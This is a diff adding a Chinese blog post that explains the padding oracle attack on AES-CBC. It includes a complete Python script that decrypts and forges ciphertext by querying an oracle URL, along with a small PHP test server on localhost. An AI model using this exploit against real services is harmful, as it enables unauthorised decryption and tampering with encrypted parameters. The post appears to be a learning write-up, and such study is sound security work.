@@ -1,0 +1,664 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="代码是完成了，但还是有个小疑问（会在最后给出描述），问了好多师傅但都没回我，好尴尬-_-||">
+<meta name="keywords">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Padding Oracle Attack">
+<meta property="og:url" content="https://someonesometimes.github.io/2017/09/04/Padding-Oracle-Attack/index.html">
+<meta property="og:site_name" content="Yiruma">
+<meta property="og:description" content="代码是完成了，但还是有个小疑问（会在最后给出描述），问了好多师傅但都没回我，好尴尬-_-||">
+<meta property="og:updated_time" content="2017-09-04T13:05:33.688Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Padding Oracle Attack">
+<meta name="twitter:description" content="代码是完成了，但还是有个小疑问（会在最后给出描述），问了好多师傅但都没回我，好尴尬-_-||">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://someonesometimes.github.io/2017/09/04/Padding-Oracle-Attack/"/>
+
+
+
+
+
+  <title>Padding Oracle Attack | Yiruma</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Yiruma</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-link">
+          <a href="/links" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            menu.link
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="https://someonesometimes.github.io/2017/09/04/Padding-Oracle-Attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Yiruma">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yiruma">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Padding Oracle Attack</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-04T20:29:19+08:00">
+                2017-09-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>代码是完成了，但还是有个小疑问（会在最后给出描述），问了好多师傅但都没回我，好尴尬-_-||</p>
+<a id="more"></a>
+<h2 id="首先描述应用场景"><a href="#首先描述应用场景" class="headerlink" title="首先描述应用场景"></a>首先描述应用场景</h2><p>有许多网站存在这样的功能：参数是经过对称加密算法加密过的，一般用aes的居多，然后传到服务端后先对参数进行解码，之后再去利用。这样有什么好处呢？基本就像是封死了这个参数点一样，因为我们没有密钥，所以也无法构造出有效的参数来（大多数都会在解密时发现错误而丢弃），而Padding Oracle Attack可以适用于这样一种情况：<br><strong>在服务端使用的分组加密模式为CBC+PKCS填充方案，并且在传入无法解密的cipherText值与传入可以解密的CipherText值具有两种不同的回显时，我们就可以通过这种攻击方式来计算得到密文对应的明文，同时也可以计算出明文所对应的密文</strong></p>
+<h2 id="然后是重头戏，对Padding-Oracle-Attack的理解"><a href="#然后是重头戏，对Padding-Oracle-Attack的理解" class="headerlink" title="然后是重头戏，对Padding Oracle Attack的理解"></a>然后是重头戏，对Padding Oracle Attack的理解</h2><p>直接放上赵颉老师翻译的一篇博文，貌似大家都是从这篇文章接触的这种攻击方式<br>有一点要提醒的是，博文里面的讲解用的是DES，所以每个分块都是8个字节，而现在常见的都是aes也就是一块是16个字节的，自己改一下就好</p>
+<h2 id="实现代码，尽可能的注释详细些"><a href="#实现代码，尽可能的注释详细些" class="headerlink" title="实现代码，尽可能的注释详细些"></a>实现代码，尽可能的注释详细些</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div></pre></td><td class="code"><pre><div class="line">#coding=utf-8</div><div class="line">import requests</div><div class="line"></div><div class="line"></div><div class="line">def hex_format(num,legth):</div><div class="line">    str = hex(num)[2:]</div><div class="line">    if str[len(str)-1] == &apos;L&apos;:</div><div class="line">        str = str[:-1]</div><div class="line">    return &apos;0&apos;*(legth-len(str))+str</div><div class="line"></div><div class="line"></div><div class="line">#这个是由使用者根据情况自定义的对回显界面的判断</div><div class="line">def inject(s, iv, cipher):</div><div class="line"></div><div class="line">    url = &apos;http://localhost/test.php?id=&#123;&#125;&apos;.format(iv+cipher)</div><div class="line">    # print url</div><div class="line">    retu = s.get(url)</div><div class="line">    # print retu.content</div><div class="line">    if retu.content == &apos;hacker?&apos;:</div><div class="line">        return False</div><div class="line">    if retu.content == &apos;1&apos;:</div><div class="line">        return True</div><div class="line">    return False</div><div class="line"></div><div class="line"></div><div class="line">#输入cipher的十六进制形式的str，可以得到mid值的十六进制形式的str</div><div class="line">def get_aes_mid(cipher):</div><div class="line"></div><div class="line">    def get_list_to_str_(iv):</div><div class="line">        retu = &quot;&quot;</div><div class="line">        for i in iv:</div><div class="line">            retu += hex_format(i,2)</div><div class="line">        return retu</div><div class="line"></div><div class="line">    #避免重复建立requests对象</div><div class="line">    s = requests.session()</div><div class="line"></div><div class="line">    #主要就是对iv进行遍历，为了方便操作采用这种list的形式，元素为int型   同时建立输出参数mid_str</div><div class="line">    iv = [0 for i in range(16)]</div><div class="line">    mid_list = [0 for i in range(16)]</div><div class="line"></div><div class="line">    #padding是每经过一轮都要变化的，因为每一轮都在爆破不同位</div><div class="line">    padding = 0x01</div><div class="line"></div><div class="line">    tag = 1</div><div class="line">    for i in range(16)[::-1]:</div><div class="line">        if (tag == 0):</div><div class="line">            print &apos;在此处尝试了所有可能也没有发现匹配，请尝试分析&apos;</div><div class="line">            exit()</div><div class="line">        tag = 0</div><div class="line">        for j in range(0x100):</div><div class="line"></div><div class="line">            #至此层，是对iv[i]进行遍历，然后生成一个iv_str用于发送出去</div><div class="line">            iv[i] = j</div><div class="line">            iv_str = get_list_to_str_(iv)</div><div class="line"></div><div class="line">            #基于服务器的返回情况进行判断，成立可以跳出此循环，进行下一位的爆破</div><div class="line">            if (inject(s, iv_str, cipher)):</div><div class="line">                #如果成立的话，进行以下操作</div><div class="line">                #   基于iv对应位的值以及padding的值生成mid值</div><div class="line">                #   更新padding的填充方式，也就是加一</div><div class="line">                #   对应修改iv位上的值，由修改后的padding与mid值得到</div><div class="line">                mid = iv[i]^padding</div><div class="line">                print hex_format(mid, 2)</div><div class="line">                tag = 1</div><div class="line">                mid_list[i] = mid</div><div class="line">                padding += 1</div><div class="line">                for k in range(i,16):</div><div class="line">                    iv[k] = padding^mid_list[k]</div><div class="line">                break</div><div class="line">    mid_str = get_list_to_str_(mid_list)</div><div class="line">    #print mid_str</div><div class="line">    return mid_str</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">def padding_oracle_get_cipher(plain):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    参数：明文字符串即可,\n \x0a是支持的，不支持0x0a  %0a,所以要注意转化</div><div class="line"></div><div class="line">    生成明文对应的密文的方式：</div><div class="line">        1、将明文转化为二进制格式并进行填充操作，并从最后一组开始</div><div class="line">        2、最后一组的操作为：传入任意密文得到mid值，并由明文得到iv值，作为下一组的密文</div><div class="line">        3、开始倒数第二组，将上一组的iv作为密文，得到mid值，然后由明文得到iv值，作为下一组的密文</div><div class="line">        4、。。。。</div><div class="line">        5、一直到最后一组，所解得的值作为IV值</div><div class="line">        6、将所有轮的结果连到一起构成cipher</div><div class="line"></div><div class="line">    返回：iv，cipher</div><div class="line">    &quot;&quot;&quot;</div><div class="line"></div><div class="line">    #转化明文为二进制格式</div><div class="line">    plain = plain.encode(&apos;hex&apos;)</div><div class="line"></div><div class="line">    #对明文进行填充</div><div class="line">    if (len(plain) % 32 != 0):</div><div class="line">        temp = (32-len(plain)%32)/2</div><div class="line">        plain += hex_format(temp,2)*temp</div><div class="line">    else:</div><div class="line">        plain += &apos;10&apos;*16</div><div class="line"></div><div class="line">    #将明文进行分组</div><div class="line">    plain_list = []</div><div class="line">    for i in range(len(plain))[::32]:</div><div class="line">        plain_list.append(plain[i:i+32])</div><div class="line">    print plain_list</div><div class="line"></div><div class="line">    #循环求中间值,需要先指定最后一组密文,就由1组成吧</div><div class="line">    cipher_block = &apos;1&apos;*32</div><div class="line">    cipher = &quot;&quot; + cipher_block</div><div class="line">    for i in range(len(plain_list))[::-1]:</div><div class="line">        #求到对应mid块</div><div class="line">        mid_block = get_aes_mid(cipher_block)</div><div class="line">        #由mid与当前的plain块得到cipehr块并加进去，同时结果作为下一组求mid的参数</div><div class="line">        cipher_block = hex_format(int(mid_block,16) ^ int(plain_list[i],16), 32)</div><div class="line">        cipher = cipher_block + cipher</div><div class="line"></div><div class="line">    return cipher[:32],cipher[32:],cipher</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">def padding_oracle_get_plain(cipher):</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    参数：IV+cipher</div><div class="line"></div><div class="line">    解密密文对应明文方法：</div><div class="line">        1、将IV与cipher连到一起，并分割成list的形式</div><div class="line">        2、从列表的第二组开始，操作为，传入对应的cipher块得到对应的mid值，并由index-1对应的块异或得到明文值</div><div class="line">        3、。。。。</div><div class="line">        4、一直到最后一组，所解得的值作为明文连起来构成明文</div><div class="line"></div><div class="line">    返回：明文对应的十六进制</div><div class="line">    &quot;&quot;&quot;</div><div class="line"></div><div class="line">    #对cipher进行长度检查并切片处理</div><div class="line">    if(len(cipher)%32 != 0):</div><div class="line">        print &apos;长度不是32的倍数&apos;</div><div class="line">        return</div><div class="line">    cipher_list = []</div><div class="line">    for i in range(len(cipher))[::32]:</div><div class="line">        cipher_list.append(cipher[i:i+32])</div><div class="line"></div><div class="line">    plain = &quot;&quot;</div><div class="line"></div><div class="line">    for i in range(len(cipher_list))[1:]:</div><div class="line">        mid_block = get_aes_mid(cipher_list[i])</div><div class="line">        plain += hex_format(int(mid_block,16) ^ int(cipher_list[i-1],16), 32)</div><div class="line"></div><div class="line">    return plain,plain.decode(&apos;hex&apos;)</div></pre></td></tr></table></figure>
+<h2 id="搭建测试环境"><a href="#搭建测试环境" class="headerlink" title="搭建测试环境"></a>搭建测试环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if(isset($_GET[&apos;id&apos;]) &amp;&amp; $_GET[&apos;id&apos;] != &quot;&quot;)&#123;</div><div class="line">    $iv = substr($_GET[&apos;id&apos;], 0, 32);</div><div class="line">    $iv = pack(&apos;H*&apos;, $iv);</div><div class="line">    $cipher = substr($_GET[&apos;id&apos;], 32);</div><div class="line">    $cipher = pack(&apos;H*&apos;,$cipher);</div><div class="line">    $retu = openssl_decrypt($cipher, &apos;aes-128-cbc&apos;,</div><div class="line">        hash(&apos;md5&apos;, &apos;Yiruma&apos;, true), OPENSSL_RAW_DATA, $iv);</div><div class="line"></div><div class="line">    if ($retu!==False) &#123;</div><div class="line">        echo &apos;1&apos;;</div><div class="line">    &#125;else&#123;</div><div class="line">        echo &apos;hacker?&apos;;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<h2 id="一点疑惑"><a href="#一点疑惑" class="headerlink" title="一点疑惑"></a>一点疑惑</h2><p>如果仔细看了赵老师的博客后都知道我们每个字节的测试都是基于解到的plain是否满足最后为0x01  0x020x02 0x030x030x03这种形式，但是在我们测试最后一个字节的时候会出现什么情况？？我们希望服务器在解到10101010101010101010101010101010的时候给我们回显，但是这时候对应的字符串是””，因为上面这串数表示所有的字节都是填充位，也就是并没有字符串。<br>OK，那我们可以考虑下，如果服务端是这样写的呢？if($retu){echo ‘1’}else{echo ‘hacker?’},那么这个时候空字符串就会对应回显’hacker?’,这并不是我们想看到的，因为如果唯一能被aes正常解密的一次猜测都对应这样的回显的话，那对这个字节的256次尝试将不会看到一次对应为1的回显。也就是说最后一个字节将无法求得。<br>有没有大佬能给出解释呢，是需要在Padding Oracle Attack的代码上要有所改进吗？</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/08/31/OAuth授权流程学习以及Turning-Self-XSS-into-Good-XSS/" rel="prev" title="OAuth授权流程学习以及Turning Self-XSS into Good-XSS">
+                OAuth授权流程学习以及Turning Self-XSS into Good-XSS <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="Yiruma" />
+          <p class="site-author-name" itemprop="name">Yiruma</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">17</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#首先描述应用场景"><span class="nav-number">1.</span> <span class="nav-text">首先描述应用场景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#然后是重头戏，对Padding-Oracle-Attack的理解"><span class="nav-number">2.</span> <span class="nav-text">然后是重头戏，对Padding Oracle Attack的理解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实现代码，尽可能的注释详细些"><span class="nav-number">3.</span> <span class="nav-text">实现代码，尽可能的注释详细些</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#搭建测试环境"><span class="nav-number">4.</span> <span class="nav-text">搭建测试环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一点疑惑"><span class="nav-number">5.</span> <span class="nav-text">一点疑惑</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Yiruma</span>
+</div>
+
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
